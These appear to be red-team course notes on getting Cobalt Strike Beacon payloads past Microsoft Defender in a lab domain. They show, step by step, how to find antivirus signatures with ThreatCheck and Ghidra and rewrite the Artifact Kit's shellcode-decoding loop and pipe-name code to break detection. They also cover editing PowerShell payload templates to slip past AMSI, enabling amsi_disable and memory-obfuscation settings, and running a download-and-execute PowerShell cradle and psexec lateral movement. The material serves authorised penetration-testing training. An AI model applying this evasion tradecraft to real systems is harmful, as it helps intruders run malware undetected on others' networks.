# Defender Antivirus

Microsoft Defender is pre-installed with Windows (both desktop and server editions), which has become a formidable defense. There are three facets to its detection capability to be explored:

* On-disk
* In-memory
* Behavioural

It's useful to understand how payloads are generated in CS. Beacon is written as a reflective DLL, so there's the core Beacon DLL (everything that make Beacon actually function) plus a reflective loader component. Those are then converted into position independent shellcode, which when injected and executed, calls the reflective loader entry point. The reflective loader then loads the Beacon DLL into memory and kicks off a new thread to run it.

    Reflective Loader + Beacon DLL --> Shellcode

Settings from the Malleable C2 profile (e.g. callback addresses) are stamped into the DLL when payloads are generated; the shellcode is generated, XOR'd, then stamped into them. The artifacts act as "simple" shellcode injectors. They all, with the exception of the service binary, inject Beacon shellcode into themselves.

    XOR'd shellcode --> Allocate RW memory --> Decode shellcode --> Write memory --> Change memory to RX --> Create thread

The service binary is identical to this, except that it spawns another process and performs remote injection instead. 

The complication when trying to bypass AV signatures is knowing which "part" of the payload they apply to - the core Beacon, the reflective loader, or the artifact.

## Artifact Kit

Though dropping files to disk has a bad reputation, it's sometimes unavoidable to use certain tactics (e.g. show that we have access to the File Server, but we can't PsExec to it because the default service binary payload is detected by Defender).

    beacon> ls \\fs.dev.cyberbotic.io\c$
    beacon> jump psexec64 fs.dev.cyberbotic.io smb
    [-] Could not start service 633af16 on fs.dev.cyberbotic.io: 225
    PS C:\Users\Attacker> net helpmsg 225
    Operation did not complete successfully because the file contains a virus or potentially unwanted software.

If we copy the payload to our local desktop and check the associated log, we can see that the "file" was detected.

    PS C:\Users\Attacker> copy C:\Payloads\smb_x64.svc.exe .\Desktop\
    PS C:\Users\Attacker> Get-MpTreatDetection | sory $_.InitialDetectionTime | select -first 1

The Cobalt Strike artifacts in the output are nothing more than shellcode runners that inject Beacon shellcode when executed. As a rule of thumb, they inject the shellcode into themselves (e.g. using the VirtualAlloc & CreateThread pattern). The service binary is the one exception, as it spawns a new process and injects the shellcode into that instead. So when moving laterally with PsExec, the artifact can be deleted from disk immediately.

The Artifact Kit contains the source code for these artifacts and is designed to facilitate the development of sandbox-safe injectors. The idea is to develop artifacts that inject Beacon shellcode in a way that cannot be emulated by AV engines. There are several bypass techniques provided with the kit which you can modify, or you can implement entirely new ones yourself. Where the Artifact Kit does not help is with making Beacon resilient to detection once it's running in memory (e.g. from memory scanners).

The kit can be found in C:\Tools\cobaltstrike\arsenal-kit\kits\artifact.

The code for the entry point of each artifact format (i.e. EXE and DLL) can be found in src-main. These include dllmain.c for the DLL artifacts, main.c for the EXE artifacts, and svcmain.c for the Service EXE artifacts. These just call a function called start, so you should not need to modify these files in most cases. The implementation of this function can be found in each bypass file.

These can be found in src-common and are named bypass-<technique>.c.  The included ones are:

* mailslot - reads the shellcode over a mailslot.
* peek - uses a combination of Sleep, PeekMessage and GetTickCount.
* pipe - reads the shellcode over a named pipe.
* readfile - artifact reads itself from disk and seeks to find the embedded shellcode.

Before making any modifications to the kit, let's just build one of these variants as it is. The kit includes a build script which uses mingw to compile the artifacts.

    ubuntu@DESKTOP-3BSK7NO /m/c/T/c/a/k/artifact> ./build.sh
    [Artifact kit] [-] Usage:
    [Artifact kit] [-] ./build <techniques> <allocator> <stage size> <rdll size> <include resource file> <stack spoof> <syscalls> <output directory>
    [Artifact kit] [-]  - Techniques       - a space separated list
    [Artifact kit] [-]  - Allocator        - set how to allocate memory for the reflective loader.
    [Artifact kit] [-]                       Valid values [HeapAlloc VirtualAlloc MapViewOfFile]
    [Artifact kit] [-]  - Stage Size       - integer used to set the space needed for the beacon stage.
    [Artifact kit] [-]                       For a 0K   RDLL stage size should be 310272 or larger
    [Artifact kit] [-]                       For a 5K   RDLL stage size should be 310272 or larger
    [Artifact kit] [-]                       For a 100K RDLL stage size should be 444928 or larger
    [Artifact kit] [-]  - RDLL Size        - integer used to specify the RDLL size. Valid values [0, 5, 100]
    [Artifact kit] [-]  - Resource File    - true or false to include the resource file
    [Artifact kit] [-]  - Stack Spoof      - true or false to use the stack spoofing technique
    [Artifact kit] [-]  - Syscalls         - set the system call method
    [Artifact kit] [-]                       Valid values [none embedded indirect indirect_randomized]
    [Artifact kit] [-]  - Output Directory - Destination directory to save the output
    [Artifact kit] [-] Example:
    [Artifact kit] [-]   ./build.sh "peek pipe readfile" HeapAlloc 310272 5 true true indirect /tmp/dist/artifact

Review the README.md file inside the Artifact Kit directory for more information. Let's build a new set of artifact templates using the bypass-pipe technique:
    
    ubuntu@DESKTOP-3BSK7NO /m/c/T/c/a/k/artifact> ./build.sh pipe VirtualAlloc 310272 5 false false none /mnt/c/Tools/cobaltstrike/artifacts
    ...
    [Artifact kit] [+] The artifacts for the bypass technique 'pipe' are saved in '/mnt/c/Tools/cobaltstrike/artifacts/pipe'

Each artifact flavor is compiled to /mnt/c/Tools/cobaltstrike/artifacts/pipe/, along with an aggressor script, artifact.cna.

Before loading these into CS, analyse them with a tool like ThreatCheck. This will split the file scan them with Defender to reveal any parts that trip static signatures.

    PS C:\Users\Attacker> C:\Tools\ThreatCheck\ThreatCheck\bin\Debug\ThreatCheck.exe -f C:\Tools\cobaltstrike\artifacts\pipe\artifact64svcbig.exe

#### Disable real-time protection before running ThreatCheck against binary artifacts.

The stageless service binary artifact in the lab has something that Defender doesn't like. IDA or Ghidra can dissect the file to see what. Launch Ghidra by running the start script at C:\Tools\ghidra-10.3.1\ghidraRun.bat. 

1. Create a new non-shared project, then import the artifact by going to File > Import File.
2. Open it in the CodeBrowser.
3. When prompted, analyze the binary (the default selected analyzers are fine).
4. Find the portion of code reported by ThreatCheck.
    * Search for a specific byte sequence output by ThreatCheck, for example C1 83 E1 07 8A 0C 0A 41 30 0C 01 48 FF C0 EB E9. Go to Search > Memory.
    * Or use the "bad bytes offset" given by ThreatCheck. Select Navigation > Go To and enter file(n) where n is the offset. In this case it would be file(0xBEC).
5. The portion of highlighted code is a for loop. Go to the Artifact Kit source code and search for any such loops.
6. Dismiss most of these files because we didn't use the readfile bypass nor did we enable syscalls. The candidates in patch.c seem the most promising. Because this is a service binary payload, we know that it will perform a "migration" (i.e. spawns a new process and injects Beacon shellcode into it before exiting). This spawn function under an #ifdef _MIGRATE_ directive is a dead ringer for the decompiled version in Ghidra.
7. To break the detection, modify the routine to compile to a different byte sequence:

        for (x = 0; x < length; x++) {
            char* ptr = (char *)buffer + x;
        
            /* do something random */
            GetTickCount();
        
            *ptr = *ptr ^ key[x % 8];
        }

Rebuild the kit and scan the new version of the artifact, which has a different signature. This is an iterative process, so repeat these steps until all the detections are gone.

Another one seems related to the sprintf call used to create the pseudo-random pipe name in bypass-pipe.c. Change

    sprintf(pipename, "%c%c%c%c%c%c%c%c%cnetsvc\\%d", 92, 92, 46, 92, 112, 105, 112, 101, 92, (int)(GetTickCount() % 9898));

to something like:

    sprintf(pipename, "%c%c%c%c%c%c%c%c%crasta\\mouse", 92, 92, 46, 92, 112, 105, 112, 101, 92);

In most cases, it doesn't matter the change, as long as it's different (and still functional).

To use new artifacts, load the aggressor script. Go to CS > Script Manager > Load, select the artifact.cna file in the output directory. Any DLL and EXE payloads generated from here on use the new artifacts, so use Payloads > Windows Stageless Generate All Payloads to replace all payloads in C:\Payloads.

Delete the existing payloads first because they sometimes only get partially overwritten with the new ones.

Should now be able to move laterally to the file server using PsExec.

    beacon> jump psexec64 fs.dev.cyberbotic.io smb
    Started service 96126c2 on fs.dev.cyberbotic.io
    [+] established link to child beacon: 10.10.122.15

Unload the CNA from the Script Manager to revert to the default payloads.

## Malleable C2

Beacon can also be caught when running in memory. Some actions (e.g. lateral movement) trigger memory scans; but Defender also does routine scans, so the time between spawning a Beacon and the time to detection varies. The "sms" label in the Defender UI shows the alert was from a memory scan (```Detected: Behavior:Win32/CobaltStrike.H!sms```).

Get-MpThreatDetection labels them as behavior:_process:

    Resources                      : {behavior:_process: C:\Windows\System32\rundll32.exe, pid:3196:59045527721095,
                                     process:_pid:3196,ProcessStart:133415922931504282}

Scanning the shellcode payload type with ThreatCheck can help find these signatures because although the service binary artifact itself is "clean":

    PS C:\Users\Attacker\Desktop> C:\Tools\ThreatCheck\ThreatCheck\bin\Debug\ThreatCheck.exe -f .\http_x64.svc.exe
    [+] No threat found!
    [*] Run time: 0.55s

The raw shellcode is not:

    PS C:\Users\Attacker\Desktop> ThreatCheck.exe -f .\http_x64.xprocess.bin
    [+] Target file size: 295936 bytes
    [+] Analyzing...
    [!] Identified end of bad bytes at offset 0xF61F

The signature(s) target the reflective loader or the Beacon DLL. The Beacon source code is closed source. We could technically write a completely custom reflective loader through the UDRL kit (out of scope for CRTO). The easiest way to make modifications to both of these components is by using what's exposed in Malleable C2. Four settings to try:

    stage {
            set userwx "false";    // allocate memory for the Beacon DLL as RW/RX, not RWX
            set cleanup "true";    // free memory associated with the reflective loader after loading
            set obfuscate "true";  // load Beacon into memory without DLL headers; reduces the number of indicators in memory (among other things)
            set module_x64 "xpsservices.dll"; // blends in better by masquerading as an existing DLL
            set module_x86 ...                // Must be equal or larger size than Beacon, and must not be needed
    }

## Resource Kit

The Antimalware Scan Interface (AMSI) allows applications to integrate themselves with an antivirus engine. It was designed to tackle "fileless" malware that was so heavily popularised by tools like the [EmpireProject](https://github.com/EmpireProject/Empire) (used PS to get an in-memory C2). Any app can use AMSI to scan user input for malicious content. Many components now use AMSI including PowerShell, the Windows Script Host, JavaScript, VBScript, and VBA. Using one of the PS payloads on our attacker it will get blocked:

    PS C:\Users\Attacker> C:\Payloads\smb_x64.ps1
    At C:\Payloads\smb_x64.ps1:1 char:1
    + Set-StrictMode -Version 2
    + ~~~~~~~~~~~~~~~~~~~~~~~~~
    This script contains malicious content and has been blocked by your antivirus software.

Defender shows the malware was in memory by tagging Resources with amsi: rather than file:.

Detections are still based on "known bad" signatures. PS files are a little easier to analyse compared to binary files; scanning with ThreatCheck and the -e amsi parameter shows bad strings.
    
    PS C:\Users\Attacker> ThreatCheck.exe -f C:\Payloads\smb_x64.ps1 -e amsi
    [+] Target file size: 358025 bytes
    [+] Analyzing...
    [!] Identified end of bad bytes at offset 0x57450

Enable real-time protection in Defender before running ThreatCheck against script artifacts.

Pay attention to the loop on lines 26-28 of smb_x64.ps1:

    for ($x = 0; $x -lt $var_code.Count; $x++) {
    	$var_code[$x] = $var_code[$x] -bxor 35
    }

As a quick test  change the $x and $var_code variable names to something else, and ThreatCheck now reports the payload as clean.

To make this change permanent across all the PowerShell payloads, modify the relevant template in the Resource Kit. Where the Artifact Kit was used to modify the binary artifacts, the Resource Kit is used to modify the script-based artifacts including the PowerShell, Python, HTA and VBA payloads. The Kit can be found in C:\Tools\cobaltstrike\arsenal-kit\kits\resource and the 64-bit stageless PowerShell payload is generated from template.x64.ps1. As before, use the included build script and specify an output directory, then load resources.cna into Cobalt Strike.

    ubuntu@DESKTOP-3BSK7NO /m/c/T/c/a/k/resource> ./build.sh /mnt/c/Tools/cobaltstrike/resources
    [Resource Kit] [+] Copy the resource files
    [Resource Kit] [+] Generate the resources.cna from the template file.
    [Resource Kit] [+] The resource kit files are saved in '/mnt/c/Tools/cobaltstrike/resources'

PS payloads using the Scripted Web Delivery method will generally get caught when stageless PowerShell payloads do not:

    PS C:\Users\Attacker> iex (new-object net.webclient).downloadstring("http://10.10.5.50/a")
    IEX : At line:1 char:1

It uses the compress.ps1 template instead, which extracts the payload from a Gzip stream. AMSI will flag almost anything as malicious if it sees a binary file coming out of a Gzip stream. Re-work this template as well if need to use a compressed version. A workaround is to just host a stageless PS payload directly via Site Management > Host File.

    PS C:\Users\Attacker> iex (new-object net.webclient).downloadstring("http://10.10.5.50/a2")

## AMSI vs Post-Exploitation

AMSI will also catch various post-exploitation commands which AMSI can instrument (e.g. PS, powerpick, and execute-assembly). Beacon spawns new processes to execute these commands, and each process gets its own copy of AMSI. Here Beacon spawns powershell.exe and attempts to load PowerView.ps1, but caught by AMSI and killed it and  the process that spawned it (Beacon):

    beacon> run hostname
    fs
    beacon> powershell-import C:\Tools\PowerSploit\Recon\PowerView.ps1
    beacon> powershell Get-Domain
    [-] lost link to parent beacon: 10.10.123.102
    
    beacon> remote-exec winrm fs Get-MpThreatDetection
    PSComputerName        : fs
    ProcessName           : C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
    RemediationTime       : 9/14/2022 5:01:18 PM
    Resources             : {amsi:_\Device\HarddiskVolume1\Windows\System32\WindowsPowerShell\v1.0\powershell.exe}

The same happens if executing a known .NET assembly:

    beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe
    [-] Failed to load the assembly w/hr 0x8007000b
    [-] lost link to parent beacon: 10.10.123.102
    PSComputerName                 : fs
    ProcessName                    : C:\Windows\System32\rundll32.exe
    RemediationTime                : 9/14/2022 5:18:35 PM
    Resources                      : {amsi:_\Device\HarddiskVolume1\Windows\System32\rundll32.exe}

CS has a config in Malleable C2 called amsi_disable, which patches memory to disable AMSI in the spawned process prior to injecting the post-ex capability. amsi_disable only applies to powerpick, execute-assembly, and psinject (not PS).

1: SSH into the team server and open the profile used (e.g. webbug.profile):

    attacker@ubuntu ~/cobaltstrike> vim c2-profiles/normal/webbug.profile

2: Just above the http-get block add:

    post-ex {
            set amsi_disable "true";
    }

3: Check the profile with c2lint to make sure it still works:

    attacker@ubuntu ~/cobaltstrike> ./c2lint c2-profiles/normal/webbug.profile

4: Restart team server and re-acquire a Beacon on the file server. Execute Rubeus:

    beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe

Beacon probably still dies quickly; see behavioural detections below.

## Manual AMSI Bypasses

You may run into situations where ThreatCheck gives the "all clear" on a payload, but it still gets caught by AMSI.  This is particularly troublesome for initial access or lateral movement payloads, because Beacon's amsi_disable directive does not apply to them.



